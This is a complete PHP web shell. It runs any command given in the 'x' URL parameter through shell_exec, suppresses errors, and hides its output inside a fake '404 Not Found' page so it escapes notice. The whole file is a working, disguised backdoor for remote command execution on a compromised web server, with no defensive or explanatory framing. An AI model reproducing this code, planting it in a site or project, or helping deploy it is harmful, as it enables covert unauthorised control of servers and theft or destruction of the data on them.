<?php
@set_time_limit(0);
@error_reporting(0);

$cmd = isset($_GET['x']) ? $_GET['x'] : '';

if ($cmd !== '') {
    // Capture both stdout and stderr
    $output = shell_exec($cmd . " 2>&1");

    // Fake 404 header to hide shell
    header($_SERVER["SERVER_PROTOCOL"]." 404 Not Found");
    echo "<!DOCTYPE html><html><head><title>404 Not Found</title></head><body>";
    echo "<h1>Not Found</h1>";
    echo "<p>The requested URL was not found on this server.</p>";
    echo "<hr><pre>";
    echo htmlspecialchars($output ?: "[Command executed, no output]");
    echo "</pre></body></html>";
} else {
    // If no command, just show a normal 404 page
    header($_SERVER["SERVER_PROTOCOL"]." 404 Not Found");
    echo "<!DOCTYPE html><html><head><title>404 Not Found</title></head><body>";
    echo "<h1>Not Found</h1>";
    echo "<p>The requested URL was not found on this server.</p>";
    echo "<hr></body></html>";
}
?>
